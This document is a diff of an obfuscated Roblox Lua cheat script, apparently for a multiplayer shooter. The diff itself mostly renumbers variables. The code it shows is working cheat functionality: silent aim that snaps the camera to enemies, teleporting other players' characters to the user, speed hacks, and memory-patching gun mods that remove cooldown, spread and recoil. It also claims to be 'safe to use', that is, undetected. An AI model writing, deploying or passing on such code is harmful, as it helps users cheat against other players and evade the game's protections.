-        if v411 == nil then
+        if v407 == nil then
             break
         end
 
-        u69.AimTab:AddSlider(v412[1], {
-            Title = v412[2],
-            Default = v412[3],
-            Min = v412[4],
-            Max = v412[5],
-            Rounding = v412[6],
-            Callback = v412[7],
+        u67.AimTab:AddSlider(v408[1], {
+            Title = v408[2],
+            Default = v408[3],
+            Min = v408[4],
+            Max = v408[5],
+            Rounding = v408[6],
+            Callback = v408[7],
         })
     end
 end
@@ -2340,41 +2387,41 @@ function UpdateFov()
     if SilentAimFov.Circle then
         SilentAimFov.Circle.Visible = SilentAimFov.Visible
 
-        local v419 = _UserInputService2
+        local v415 = _UserInputService2
 
-        SilentAimFov.Circle.Position = v419:GetMouseLocation()
+        SilentAimFov.Circle.Position = v415:GetMouseLocation()
     end
 end
 function GetClosestTargetToMouse()
-    local v420 = _UserInputService2:GetMouseLocation()
+    local v416 = _UserInputService2:GetMouseLocation()
     local _huge2 = math.huge
-    local v422 = _Players5
-    local v423, v424, v425 = pairs(v422:GetPlayers())
-    local v426 = nil
+    local v418 = _Players5
+    local v419, v420, v421 = pairs(v418:GetPlayers())
+    local v422 = nil
 
     while true do
-        local v427
+        local v423
 
-        v425, v427 = v423(v424, v425)
+        v421, v423 = v419(v420, v421)
 
-        if v425 == nil then
+        if v421 == nil then
             break
         end
-        if v427 ~= _LocalPlayer6 and v427.Character and v427.Character:FindFirstChild('HumanoidRootPart') then
-            local _HumanoidRootPart6 = v427.Character:FindFirstChild('HumanoidRootPart')
+        if v423 ~= _LocalPlayer6 and v423.Character and v423.Character:FindFirstChild('HumanoidRootPart') then
+            local _HumanoidRootPart6 = v423.Character:FindFirstChild('HumanoidRootPart')
 
             if _HumanoidRootPart6 and not _HumanoidRootPart6:FindFirstChild('TeammateLabel') then
-                local v429 = v427.Character:FindFirstChild(SilentAim.TargetPart)
+                local v425 = v423.Character:FindFirstChild(SilentAim.TargetPart)
 
-                if v429 and (v429.Position - _Workspace.CurrentCamera.CFrame.Position).Magnitude <= SilentAim.MaxDistance then
-                    local v430, v431 = _Workspace.CurrentCamera:WorldToViewportPoint(v429.Position)
+                if v425 and (v425.Position - _Workspace.CurrentCamera.CFrame.Position).Magnitude <= SilentAim.MaxDistance then
+                    local v426, v427 = _Workspace.CurrentCamera:WorldToViewportPoint(v425.Position)
 
-                    if v431 then
-                        local _Magnitude4 = (Vector2.new(v430.X, v430.Y) - v420).Magnitude
+                    if v427 then
+                        local _Magnitude4 = (Vector2.new(v426.X, v426.Y) - v416).Magnitude
 
                         if _Magnitude4 < SilentAimFov.Radius then
                             if _Magnitude4 < _huge2 then
-                                v426 = v429
+                                v422 = v425
                                 _huge2 = _Magnitude4
                             end
                         end
@@ -2384,29 +2431,29 @@ function GetClosestTargetToMouse()
         end
     end
 
-    local v433 = _Workspace
-    local v434, v435, v436 = pairs(v433:GetChildren())
+    local v429 = _Workspace
+    local v430, v431, v432 = pairs(v429:GetChildren())
 
     while true do
-        local v437
+        local v433
 
-        v436, v437 = v434(v435, v436)
+        v432, v433 = v430(v431, v432)
 
-        if v436 == nil then
+        if v432 == nil then
             break
         end
-        if v437:IsA('Model') and v437:FindFirstChild('HumanoidRootPart') and v437.Name == 'Target' then
-            local v438 = v437:FindFirstChild(SilentAim.TargetPart) or v437:FindFirstChild('HumanoidRootPart')
+        if v433:IsA('Model') and v433:FindFirstChild('HumanoidRootPart') and v433.Name == 'Target' then
+            local v434 = v433:FindFirstChild(SilentAim.TargetPart) or v433:FindFirstChild('HumanoidRootPart')
 
-            if v438 and (v438.Position - _Workspace.CurrentCamera.CFrame.Position).Magnitude <= SilentAim.MaxDistance then
-                local v439, v440 = _Workspace.CurrentCamera:WorldToViewportPoint(v438.Position)
+            if v434 and (v434.Position - _Workspace.CurrentCamera.CFrame.Position).Magnitude <= SilentAim.MaxDistance then
+                local v435, v436 = _Workspace.CurrentCamera:WorldToViewportPoint(v434.Position)
 
-                if v440 then
-                    local _Magnitude5 = (Vector2.new(v439.X, v439.Y) - v420).Magnitude
+                if v436 then
+                    local _Magnitude5 = (Vector2.new(v435.X, v435.Y) - v416).Magnitude
 
                     if _Magnitude5 < SilentAimFov.Radius then
                         if _Magnitude5 < _huge2 then
-                            v426 = v438
+                            v422 = v434
                             _huge2 = _Magnitude5
                         end
                     end
@@ -2415,21 +2462,21 @@ function GetClosestTargetToMouse()
         end
     end
 
-    return v426
+    return v422
 end
-function LookAt(p442)
-    _Workspace.CurrentCamera.CFrame = CFrame.lookAt(_Workspace.CurrentCamera.CFrame.Position, p442.Position)
+function LookAt(p438)
+    _Workspace.CurrentCamera.CFrame = CFrame.lookAt(_Workspace.CurrentCamera.CFrame.Position, p438.Position)
 end
-function SilentAimUIS(p443, p444)
-    if not p444 and (SilentAim.Enabled and getgenv().state == 2) and (p443.UserInputType == Enum.UserInputType.MouseButton1 and math.random(0, 100) <= SilentAim.HitChance) then
-        local v445 = GetClosestTargetToMouse()
+function SilentAimUIS(p439, p440)
+    if not p440 and (SilentAim.Enabled and getgenv().state == 2) and (p439.UserInputType == Enum.UserInputType.MouseButton1 and math.random(0, 100) <= SilentAim.HitChance) then
+        local v441 = GetClosestTargetToMouse()
 
-        if v445 ~= nil then
+        if v441 ~= nil then
             if SilentAim.NotWorkIfFlashed and _Lighting:FindFirstChild('Flashbang') then
                 return
             end
 
-            LookAt(v445)
+            LookAt(v441)
         end
     end
 end
@@ -2439,23 +2486,23 @@ _RunService6.RenderStepped:Connect(function()
 end)
 _UserInputService2.InputBegan:Connect(SilentAimUIS)
 DrawFov()
-u69.Silent:AddParagraph({
+u67.Silent:AddParagraph({
     Title = 'Please get Szoo client for better experince.',
     Content = ' \u{25cf} Currently Safe to use\n \u{25cf} If not use Szoo autoclicker client then do taptap to connect.',
 })
 
-local _SAimtgl = u69.Silent:AddToggle('SAimtgl', {
+local _SAimtgl = u67.Silent:AddToggle('SAimtgl', {
     Title = 'Silent Aim [V1] [Safe]',
     Description = '\u{fffd}\u{fffd}\u{fffd}\u{fffd}\u{fffd}\u{fffd} Spam click to make it work\n\u{fffd}\u{fffd}\u{fffd}\u{fffd}\u{fffd}\u{fffd} This is safe to use',
     Default = false,
 })
-local _Fovtgl = u69.Silent:AddToggle('Fovtgl', {
+local _Fovtgl = u67.Silent:AddToggle('Fovtgl', {
     Title = 'Show FOV',
     Default = false,
 })
-local v448 = _SAimtgl
+local v444 = _SAimtgl
 
-_SAimtgl.OnChanged(v448, function()
+_SAimtgl.OnChanged(v444, function()
     if textLabels and textLabels.silentaim then
         textLabels.silentaim.Visible = _Options.SAimtgl.Value
     end
@@ -2463,37 +2510,37 @@ _SAimtgl.OnChanged(v448, function()
     SilentAim.Enabled = _SAimtgl.Value
 end)
 
-local v449 = _Fovtgl
+local v445 = _Fovtgl
 
-_Fovtgl.OnChanged(v449, function()
+_Fovtgl.OnChanged(v445, function()
     SilentAimFov.Visible = _Fovtgl.Value
 end)
-u69.Silent:AddSlider('SFovSlider', {
+u67.Silent:AddSlider('SFovSlider', {
     Title = 'Silent Fov Radius',
     Description = 'Adjust the FOV Radius',
     Default = 150,
     Min = 50,
     Max = 900,
     Rounding = 0,
-    Callback = function(p450)
-        SilentAimFov.Radius = p450
+    Callback = function(p446)
+        SilentAimFov.Radius = p446
 
         if SilentAimFov.Circle then
-            SilentAimFov.Circle.Radius = p450
+            SilentAimFov.Circle.Radius = p446
         end
     end,
 })
-u69.Silent:AddColorpicker('SFovColorpicker', {
+u67.Silent:AddColorpicker('SFovColorpicker', {
     Title = 'Fov Color',
     Default = Color3.fromRGB(96, 205, 255),
-}):OnChanged(function(p451)
-    SilentAimFov.Color = p451
+}):OnChanged(function(p447)
+    SilentAimFov.Color = p447
 
     if SilentAimFov.Circle then
-        SilentAimFov.Circle.Color = p451
+        SilentAimFov.Circle.Color = p447
     end
 end)
-u69.Silent:AddDropdown('TargetpartDropdown', {
+u67.Silent:AddDropdown('TargetpartDropdown', {
     Title = 'Target Dropdown',
     Description = 'What will be targeted?',
     Values = {
@@ -2504,19 +2551,19 @@ u69.Silent:AddDropdown('TargetpartDropdown', {
     },
     Multi = false,
     Default = 1,
-}):OnChanged(function(p452)
-    if p452 == 'Legit' then
+}):OnChanged(function(p448)
+    if p448 == 'Legit' then
         SilentAim.TargetPart = math.random(1, 2) == 1 and 'Head' or 'UpperTorso'
     else
-        SilentAim.TargetPart = p452
+        SilentAim.TargetPart = p448
     end
 end)
 
 function a4()
-    u69.Gunmod:AddSection('Custom Hit Sound')
-    u69.Gunmod:AddSection('HeadShot Sound')
+    u67.Gunmod:AddSection('Custom Hit Sound')
+    u67.Gunmod:AddSection('HeadShot Sound')
 
-    local u453 = {
+    local u449 = {
         Neverlose = 'rbxassetid://8726881116',
         Gamesense = 'rbxassetid://4817809188',
         One = 'rbxassetid://7380502345',
@@ -2550,54 +2597,54 @@ function a4()
         Mario = 'rbxassetid://2815207981',
         Steve = 'rbxassetid://4965083997',
     }
-    local v454, v455, v456 = pairs(u453)
-    local u457 = {}
-    local v458 = 'rbxassetid://16537337310'
-    local v459 = 'rbxassetid://9119561046'
-    local v460 = 'rbxassetid://13110130082'
-    local v461 = 'rbxassetid://8726881116'
+    local v450, v451, v452 = pairs(u449)
+    local u453 = {}
+    local v454 = 'rbxassetid://16537337310'
+    local v455 = 'rbxassetid://9119561046'
+    local v456 = 'rbxassetid://13110130082'
+    local v457 = 'rbxassetid://8726881116'
 
     while true do
-        local v462
+        local v458
 
-        v456, v462 = v454(v455, v456)
+        v452, v458 = v450(v451, v452)
 
-        if v456 == nil then
+        if v452 == nil then
             break
         end
 
-        table.insert(u457, v456)
+        table.insert(u453, v452)
     end
 
-    local function v479(p463, p464, p465, p466, p467)
-        u69.Gunmod:AddDropdown(p464, {
+    local function v475(p459, p460, p461, p462, p463)
+        u67.Gunmod:AddDropdown(p460, {
             Title = 'Choose Hit Sound',
-            Values = u457,
+            Values = u453,
             Multi = false,
             Default = 1,
-        }):OnChanged(function(p468)
-            p466[1] = u453[p468] or p466[1]
+        }):OnChanged(function(p464)
+            p462[1] = u449[p464] or p462[1]
         end)
 
-        local u469 = nil
+        local u465 = nil
 
-        u69.Gunmod:AddToggle(p463, {
-            Title = p467,
+        u67.Gunmod:AddToggle(p459, {
+            Title = p463,
             Default = false,
-        }):OnChanged(function(p470)
-            if u469 then
-                u469:Disconnect()
+        }):OnChanged(function(p466)
+            if u465 then
+                u465:Disconnect()
             end
-            if p470 then
+            if p466 then
                 local _ClientViewModel = game:GetService('Players').LocalPlayer:WaitForChild('PlayerScripts'):WaitForChild('Modules'):WaitForChild('ClientReplicatedClasses'):WaitForChild('ClientFighter'):WaitForChild('ClientItem'):WaitForChild('ClientViewModel')
 
-                local function v474(p472)
-                    if p472:IsA('Sound') and p472.SoundId == p465 then
-                        p472:Stop()
+                local function v470(p468)
+                    if p468:IsA('Sound') and p468.SoundId == p461 then
+                        p468:Stop()
 
-                        local _Sound = Instance.new('Sound', p472.Parent)
+                        local _Sound = Instance.new('Sound', p468.Parent)
 
-                        _Sound.SoundId = p466[1]
+                        _Sound.SoundId = p462[1]
 
                         _Sound:Play()
                         _Sound.Ended:Wait()
@@ -2605,44 +2652,44 @@ function a4()
                     end
                 end
 
-                u469 = _ClientViewModel.ChildAdded:Connect(v474)
+                u465 = _ClientViewModel.ChildAdded:Connect(v470)
 
-                local v475, v476, v477 = pairs(_ClientViewModel:GetChildren())
+                local v471, v472, v473 = pairs(_ClientViewModel:GetChildren())
 
                 while true do
-                    local v478
+                    local v474
 
-                    v477, v478 = v475(v476, v477)
+                    v473, v474 = v471(v472, v473)
 
-                    if v477 == nil then
+                    if v473 == nil then
                         break
                     end
 
-                    v474(v478)
+                    v470(v474)
                 end
             end
         end)
     end
 
-    v479('CSP1', 'SoundSelector1', v458, {v459}, 'Headshot sound')
-    u69.Gunmod:AddSection('Bodyshot Sound')
-    v479('CSP2', 'SoundSelector2', v460, {v461}, 'Bodyshot sound')
+    v475('CSP1', 'SoundSelector1', v454, {v455}, 'Headshot sound')
+    u67.Gunmod:AddSection('Bodyshot Sound')
+    v475('CSP2', 'SoundSelector2', v456, {v457}, 'Bodyshot sound')
 
-    local u480 = {
+    local u476 = {
         aLqz = false,
         eJdF = Color3.fromRGB(255, 255, 255),
         rQdT = 1.5,
         pJwT = 2,
     }
-    local u481 = {
+    local u477 = {
         ['Lightning Bolt'] = 'rbxassetid://12781806168',
         ['Lightning Bolt2'] = 'rbxassetid://7151778302',
         Laser = 'rbxassetid://5864341017',
         ['Red Laser'] = 'rbxassetid://6333823534',
         DNA = 'rbxassetid://6511613786',
     }
-    local u482 = 'Lightning Bolt'
-    local u483 = {
+    local u478 = 'Lightning Bolt'
+    local u479 = {
         'rbxassetid://13110197302',
         'rbxassetid://13270206087',
         'rbxassetid://100354903585817',
@@ -2662,11 +2709,11 @@ function a4()
     }
     local _Players6 = game:GetService('Players')
     local _LocalPlayer7 = _Players6.LocalPlayer
-    local v486 = _LocalPlayer7
-    local u487 = _LocalPlayer7.GetMouse(v486)
+    local v482 = _LocalPlayer7
+    local u483 = _LocalPlayer7.GetMouse(v482)
 
-    local function u494(p488, p489)
-        if u480.aLqz then
+    local function u490(p484, p485)
+        if u476.aLqz then
             task.spawn(function()
                 local _Part = Instance.new('Part')
 
@@ -2678,47 +2725,47 @@ function a4()
 
                 local _Attachment = Instance.new('Attachment', _Part)
 
-                _Attachment.Position = p488.Position
+                _Attachment.Position = p484.Position
 
                 local _Attachment2 = Instance.new('Attachment', _Part)
 
-                _Attachment2.Position = p489
+                _Attachment2.Position = p485
 
                 local _Beam = Instance.new('Beam', _Part)
 
                 _Beam.Attachment0 = _Attachment
                 _Beam.Attachment1 = _Attachment2
                 _Beam.TextureSpeed = 2
-                _Beam.Color = ColorSequence.new(u480.eJdF)
-                _Beam.Width0 = u480.pJwT
-                _Beam.Width1 = u480.pJwT
-                _Beam.Texture = u481[u482]
+                _Beam.Color = ColorSequence.new(u476.eJdF)
+                _Beam.Width0 = u476.pJwT
+                _Beam.Width1 = u476.pJwT
+                _Beam.Texture = u477[u478]
 
-                wait(u480.rQdT)
+                wait(u476.rQdT)
                 _Part:Destroy()
             end)
         end
     end
-    local function u501(p495)
-        if p495 and p495:IsA('Sound') then
-            local v496, v497, v498 = ipairs(u483)
+    local function u497(p491)
+        if p491 and p491:IsA('Sound') then
+            local v492, v493, v494 = ipairs(u479)
 
             while true do
-                local v499
+                local v495
 
-                v498, v499 = v496(v497, v498)
+                v494, v495 = v492(v493, v494)
 
-                if v498 == nil then
+                if v494 == nil then
                     break
                 end
-                if p495.SoundId == v499 then
+                if p491.SoundId == v495 then
                     local _Character3 = _LocalPlayer7.Character
 
                     if _Character3 then
                         _Character3 = _LocalPlayer7.Character:FindFirstChild('HumanoidRootPart')
                     end
                     if _Character3 then
-                        u494(_Character3, u487.Hit.Position)
+                        u490(_Character3, u483.Hit.Position)
                     end
 
                     break
@@ -2727,18 +2774,18 @@ function a4()
         end
     end
 
-    u69.Gunmod:AddSection('Bullet Trails')
+    u67.Gunmod:AddSection('Bullet Trails')
 
-    local _btrc = u69.Gunmod:AddToggle('btrc', {
+    local _btrc = u67.Gunmod:AddToggle('btrc', {
         Title = 'Bullet Tracer',
         Default = false,
     })
-    local v503 = _btrc
+    local v499 = _btrc
 
-    _btrc.OnChanged(v503, function()
-        u480.aLqz = _btrc.Value
+    _btrc.OnChanged(v499, function()
+        u476.aLqz = _btrc.Value
     end)
-    u69.Gunmod:AddDropdown('BTDropdown', {
+    u67.Gunmod:AddDropdown('BTDropdown', {
         Title = 'Style Dropdown',
         Values = {
             'Lightning Bolt',
@@ -2749,36 +2796,36 @@ function a4()
         },
         Multi = false,
         Default = 4,
-    }):OnChanged(function(p504)
-        u482 = p504
+    }):OnChanged(function(p500)
+        u478 = p500
     end)
-    u69.Gunmod:AddSlider('BTL', {
+    u67.Gunmod:AddSlider('BTL', {
         Title = 'BulletTracerLifetime',
         Default = 1.5,
         Min = 0,
         Max = 20,
         Rounding = 0.1,
-    }):OnChanged(function(p505)
-        u480.rQdT = p505
+    }):OnChanged(function(p501)
+        u476.rQdT = p501
     end)
-    u69.Gunmod:AddSlider('BTT', {
+    u67.Gunmod:AddSlider('BTT', {
         Title = 'BulletTracerThickness',
         Default = 2,
         Min = 0,
         Max = 20,
         Rounding = 0.1,
-    }):OnChanged(function(p506)
-        u480.pJwT = p506
+    }):OnChanged(function(p502)
+        u476.pJwT = p502
     end)
-    u69.Gunmod:AddColorpicker('BTCol', {
+    u67.Gunmod:AddColorpicker('BTCol', {
         Title = 'BulletTracerColor',
         Default = Color3.fromRGB(255, 255, 255),
-    }):OnChanged(function(p507)
-        u480.eJdF = p507
+    }):OnChanged(function(p503)
+        u476.eJdF = p503
     end)
-    _Players6[game:GetService('Players').LocalPlayer.Name].PlayerScripts.Modules.ClientReplicatedClasses.ClientFighter.ClientItem.ChildAdded:Connect(function(p508)
-        if p508.Name == 'Sound' then
-            u501(p508)
+    _Players6[game:GetService('Players').LocalPlayer.Name].PlayerScripts.Modules.ClientReplicatedClasses.ClientFighter.ClientItem.ChildAdded:Connect(function(p504)
+        if p504.Name == 'Sound' then
+            u497(p504)
         end
     end)
 end
@@ -2788,102 +2835,102 @@ a4()
 local _RunService7 = game:GetService('RunService')
 local _LocalPlayer8 = _Players5.LocalPlayer
 local _CurrentCamera6 = _Workspace.CurrentCamera
-local u512 = nil
+local u508 = nil
+local u509 = false
+local u510 = true
+local u511 = 350
+local u512 = false
 local u513 = false
-local u514 = true
-local u515 = 350
-local u516 = false
-local u517 = false
 
-local function u523(p518)
-    if not (p518 and p518:FindFirstChild('HumanoidRootPart')) then
+local function u519(p514)
+    if not (p514 and p514:FindFirstChild('HumanoidRootPart')) then
         return false
     end
 
     local _Position2 = _CurrentCamera6.CFrame.Position
-    local _Position3 = p518.HumanoidRootPart.Position
-    local v521 = RaycastParams.new()
+    local _Position3 = p514.HumanoidRootPart.Position
+    local v517 = RaycastParams.new()
 
-    v521.FilterType = Enum.RaycastFilterType.Blacklist
-    v521.FilterDescendantsInstances = {
+    v517.FilterType = Enum.RaycastFilterType.Blacklist
+    v517.FilterDescendantsInstances = {
         _LocalPlayer8.Character,
         _CurrentCamera6,
     }
 
-    local v522 = _Workspace:Raycast(_Position2, _Position3 - _Position2, v521)
+    local v518 = _Workspace:Raycast(_Position2, _Position3 - _Position2, v517)
 
-    return v522 == nil and true or v522.Instance:IsDescendantOf(p518)
+    return v518 == nil and true or v518.Instance:IsDescendantOf(p514)
 end
-local function u525(p524)
-    if p524 and p524:FindFirstChild('Humanoid') then
-        return p524.Humanoid.Health > 0
+local function u521(p520)
+    if p520 and p520:FindFirstChild('Humanoid') then
+        return p520.Humanoid.Health > 0
     else
         return false
     end
 end
-local function u527(p526)
-    if p526.Character and p526.Character:FindFirstChild('HumanoidRootPart') then
-        return p526.Character.HumanoidRootPart:FindFirstChild('TeammateLabel') ~= nil
+local function u523(p522)
+    if p522.Character and p522.Character:FindFirstChild('HumanoidRootPart') then
+        return p522.Character.HumanoidRootPart:FindFirstChild('TeammateLabel') ~= nil
     else
         return false
     end
 end
-local function u530()
-    if u516 and (getgenv().state == 2 and u512) and (u512.Character and u512.Character:FindFirstChild('HumanoidRootPart')) then
+local function u526()
+    if u512 and (getgenv().state == 2 and u508) and (u508.Character and u508.Character:FindFirstChild('HumanoidRootPart')) then
         local _Character4 = _LocalPlayer8.Character
 
         if _Character4 and _Character4:FindFirstChild('HumanoidRootPart') then
-            local v529 = _Character4.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
+            local v525 = _Character4.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
 
-            u512.Character.HumanoidRootPart.CFrame = v529
+            u508.Character.HumanoidRootPart.CFrame = v525
         end
     end
 end
-local function u536(p531, p532)
-    if p532 and p532:FindFirstChild('HumanoidRootPart') then
-        local v533 = _CurrentCamera6:WorldToViewportPoint(p532.HumanoidRootPart.Position)
+local function u532(p527, p528)
+    if p528 and p528:FindFirstChild('HumanoidRootPart') then
+        local v529 = _CurrentCamera6:WorldToViewportPoint(p528.HumanoidRootPart.Position)
 
-        if v533.Z <= 0 then
-            p531.Visible = false
+        if v529.Z <= 0 then
+            p527.Visible = false
         else
-            local v534 = Vector2.new(_CurrentCamera6.ViewportSize.X / 2, _CurrentCamera6.ViewportSize.Y)
-            local v535 = Vector2.new(v533.X, v533.Y)
+            local v530 = Vector2.new(_CurrentCamera6.ViewportSize.X / 2, _CurrentCamera6.ViewportSize.Y)
+            local v531 = Vector2.new(v529.X, v529.Y)
 
-            p531.Color = u523(p532) and Color3.new(1, 0, 0) or Color3.new(0, 0, 1)
-            p531.From = v534
-            p531.To = v535
-            p531.Visible = u517 and true or false
+            p527.Color = u519(p528) and Color3.new(1, 0, 0) or Color3.new(0, 0, 1)
+            p527.From = v530
+            p527.To = v531
+            p527.Visible = u513 and true or false
         end
     else
-        p531.Visible = false
+        p527.Visible = false
     end
 end
-local function u548()
+local function u544()
     local _huge3 = math.huge
-    local v538 = Vector2.new(_CurrentCamera6.ViewportSize.X / 2, _CurrentCamera6.ViewportSize.Y / 2)
-    local v539 = _Players5
-    local v540, v541, v542 = pairs(v539:GetPlayers())
-    local v543 = nil
+    local v534 = Vector2.new(_CurrentCamera6.ViewportSize.X / 2, _CurrentCamera6.ViewportSize.Y / 2)
+    local v535 = _Players5
+    local v536, v537, v538 = pairs(v535:GetPlayers())
+    local v539 = nil
 
     while true do
-        local v544
+        local v540
 
-        v542, v544 = v540(v541, v542)
+        v538, v540 = v536(v537, v538)
 
-        if v542 == nil then
+        if v538 == nil then
             break
         end
-        if v544 ~= _LocalPlayer8 and v544.Character and (v544.Character:FindFirstChild('HumanoidRootPart') and not u527(v544)) then
-            local _Position4 = v544.Character.HumanoidRootPart.Position
+        if v540 ~= _LocalPlayer8 and v540.Character and (v540.Character:FindFirstChild('HumanoidRootPart') and not u523(v540)) then
+            local _Position4 = v540.Character.HumanoidRootPart.Position
 
-            if (_LocalPlayer8.Character.HumanoidRootPart.Position - _Position4).Magnitude <= u515 and u525(v544.Character) then
-                local v546 = _CurrentCamera6:WorldToViewportPoint(_Position4)
+            if (_LocalPlayer8.Character.HumanoidRootPart.Position - _Position4).Magnitude <= u511 and u521(v540.Character) then
+                local v542 = _CurrentCamera6:WorldToViewportPoint(_Position4)
 
-                if v546.Z > 0 then
-                    local _Magnitude6 = (Vector2.new(v546.X, v546.Y) - v538).Magnitude
+                if v542.Z > 0 then
+                    local _Magnitude6 = (Vector2.new(v542.X, v542.Y) - v534).Magnitude
 
                     if _Magnitude6 < _huge3 then
-                        v543 = v544
+                        v539 = v540
                         _huge3 = _Magnitude6
                     end
                 end
@@ -2891,10 +2938,10 @@ local function u548()
         end
     end
 
-    return v543
+    return v539
 end
 
-local u550 = (function()
+local u546 = (function()
     local _Line = Drawing.new('Line')
 
     _Line.Thickness = 2
@@ -2905,58 +2952,58 @@ local u550 = (function()
 end)()
 
 _RunService7.RenderStepped:Connect(function()
-    local v551 = u548()
+    local v547 = u544()
 
-    if u512 then
-        u536(u550, u512.Character)
+    if u508 then
+        u532(u546, u508.Character)
 
-        if u513 and u514 then
-            u530()
+        if u509 and u510 then
+            u526()
         end
-    elseif v551 and v551.Character then
-        u536(u550, v551.Character)
+    elseif v547 and v547.Character then
+        u532(u546, v547.Character)
     else
-        u550.Visible = false
+        u546.Visible = false
     end
 end)
-_UserInputService2.InputBegan:Connect(function(p552, p553)
-    if not p553 then
-        if p552.UserInputType == Enum.UserInputType.MouseButton1 then
-            local v554 = u548()
+_UserInputService2.InputBegan:Connect(function(p548, p549)
+    if not p549 then
+        if p548.UserInputType == Enum.UserInputType.MouseButton1 then
+            local v550 = u544()
 
-            if v554 and u523(v554.Character) then
-                if u514 then
-                    u513 = true
-                    u512 = v554
+            if v550 and u519(v550.Character) then
+                if u510 then
+                    u509 = true
+                    u508 = v550
                 else
-                    u512 = v554
+                    u508 = v550
 
-                    u530()
+                    u526()
 
-                    u512 = nil
+                    u508 = nil
                 end
             end
         end
     end
 end)
-_UserInputService2.InputEnded:Connect(function(p555)
-    if p555.UserInputType == Enum.UserInputType.MouseButton1 and u514 then
-        u513 = false
-        u512 = nil
+_UserInputService2.InputEnded:Connect(function(p551)
+    if p551.UserInputType == Enum.UserInputType.MouseButton1 and u510 then
+        u509 = false
+        u508 = nil
     end
 end)
-u69.Nono:AddToggle('kde', {
+u67.Nono:AddToggle('kde', {
     Title = 'Melee damage timeout',
     Description = 'Will increase meele damge times, so u can hit more damage with it.',
     Default = false,
 }):OnChanged(function() end)
-u69.Nono:AddToggle('wallbang', {
+u67.Nono:AddToggle('wallbang', {
     Title = 'Wallbang',
     Description = 'Shoot through walls.',
     Default = false,
-}):OnChanged(function(p556)
-    if p556 then
-        u67:Notify({
+}):OnChanged(function(p552)
+    if p552 then
+        u65:Notify({
             Title = 'Notification',
             Content = 'Not for you to use!',
             SubContent = 'Only for certain users.',
@@ -2966,7 +3013,7 @@ u69.Nono:AddToggle('wallbang', {
         _Options.wallbang:SetValue(false)
     end
 end)
-u69.Nono:AddToggle('Dp', {
+u67.Nono:AddToggle('Dp', {
     Title = 'Player Drag',
     Description = 'Use this if youre facing cheaters, hold Left Mouse button, it will drag player to you if player is visible.',
     Default = false,
@@ -2975,22 +3022,22 @@ u69.Nono:AddToggle('Dp', {
         textLabels.dpaint.Visible = _Options.Dp.Value
     end
 
-    u516 = _Options.Dp.Value
-    u517 = _Options.Dp.Value
+    u512 = _Options.Dp.Value
+    u513 = _Options.Dp.Value
 end)
 
-speedsect = u69.Nono:AddSection('Speed')
+speedsect = u67.Nono:AddSection('Speed')
 
 local _LocalPlayer9 = game:GetService('Players').LocalPlayer
 local _RunService8 = game:GetService('RunService')
 
 getgenv().Multiplier = 0.2
 
-local u559 = false
-local u560 = nil
+local u555 = false
+local u556 = nil
 
-local function u564()
-    u560 = _RunService8.Stepped:Connect(function()
+local function u560()
+    u556 = _RunService8.Stepped:Connect(function()
         local _Character5 = _LocalPlayer9.Character
 
         if _Character5 then
@@ -3011,87 +3058,85 @@ local function u564()
         end
     end)
 end
-local function u565()
-    if u560 then
-        u560:Disconnect()
+local function u561()
+    if u556 then
+        u556:Disconnect()
 
-        u560 = nil
+        u556 = nil
     end
 end
 
-local _SpeedBoost = u69.Nono:AddToggle('SpeedBoost', {
+local _SpeedBoost = u67.Nono:AddToggle('SpeedBoost', {
     Title = 'CFrame Speed v2',
     Default = false,
 })
-local v567 = _SpeedBoost
+local v563 = _SpeedBoost
 
-_SpeedBoost.OnChanged(v567, function()
+_SpeedBoost.OnChanged(v563, function()
     if textLabels and textLabels.bspeed then
         textLabels.bspeed.Visible = _SpeedBoost.Value
     end
 
-    u559 = _SpeedBoost.Value
+    u555 = _SpeedBoost.Value
 
-    if u559 then
-        u564()
-        warn('CFrame Speed enabled')
+    if u555 then
+        u560()
     else
-        u565()
-        warn('CFrame Speed disabled')
+        u561()
     end
 end)
-u69.Nono:AddSlider('MultiplierSlider', {
+u67.Nono:AddSlider('MultiplierSlider', {
     Title = 'Speed Limit',
     Description = 'Adjust speed multiplier (1 = 0.1, 5 = 0.5, etc.)',
     Default = 2,
     Min = 0,
     Max = 10,
     Rounding = 1,
-    Callback = function(p568)
-        getgenv().Multiplier = p568 / 10
+    Callback = function(p564)
+        getgenv().Multiplier = p564 / 10
     end,
-}):OnChanged(function(p569)
-    getgenv().Multiplier = p569 / 10
+}):OnChanged(function(p565)
+    getgenv().Multiplier = p565 / 10
 end)
-u69.Nono:AddSection('Gun Mods [Level 8 executor needed]')
+u67.Nono:AddSection('Gun Mods [Level 8 executor needed]')
 
-local function u576(p570, p571)
-    local v572, v573, v574 = pairs(getgc(true))
+local function u572(p566, p567)
+    local v568, v569, v570 = pairs(getgc(true))
 
     while true do
-        local v575
+        local v571
 
-        v574, v575 = v572(v573, v574)
+        v570, v571 = v568(v569, v570)
 
-        if v574 == nil then
+        if v570 == nil then
             break
         end
-        if type(v575) == 'table' and rawget(v575, p570) then
-            v575[p570] = p571
+        if type(v571) == 'table' and rawget(v571, p566) then
+            v571[p566] = p567
         end
     end
 end
 
-if u69 and u69.Nono then
-    u69.Nono:AddButton({
+if u67 and u67.Nono then
+    u67.Nono:AddButton({
         Title = 'Rapid Fire',
         Description = 'Fire Rapidly, but wont work in xeno or solara.',
         Callback = function()
-            u576('ShootCooldown', 0)
+            u572('ShootCooldown', 0)
         end,
     })
-    u69.Nono:AddButton({
+    u67.Nono:AddButton({
         Title = 'No Spread',
         Description = 'Bullet Will not spray, but wont work in xeno or solara.',
         Callback = function()
-            u576('ShootSpread', 0)
+            u572('ShootSpread', 0)
         end,
     })
-    u69.Nono:AddButton({
+    u67.Nono:AddButton({
         Title = 'NO Recoil',
         Description = 'Stops the recoil, but wont work in xeno or solara. Ive mead another no recoil use that.',
         Callback = function()
-            u576('ShootRecoil', 0)
+            u572('ShootRecoil', 0)
         end,
     })
 end
@@ -3111,33 +3156,33 @@ tweenDistanceBehind = defaultOffsetBehind
 tweenDistanceAbove = defaultOffsetAbove
 keybindKey = Enum.KeyCode.N
 isKeyPressed = false
-eww = u69.Nono:AddSection('Enemy Slider')
+eww = u67.Nono:AddSection('Enemy Slider')
 
-local _SlideEnm = u69.Nono:AddToggle('SlideEnm', {
+local _SlideEnm = u67.Nono:AddToggle('SlideEnm', {
     Title = 'Slide to enemy',
     Description = 'Slides to players behind.',
     Default = false,
 })
-local v579 = _SlideEnm
+local v575 = _SlideEnm
 
-_SlideEnm.OnChanged(v579, function() end)
+_SlideEnm.OnChanged(v575, function() end)
 
-Keybind = u69.Nono:AddKeybind('Keybind', {
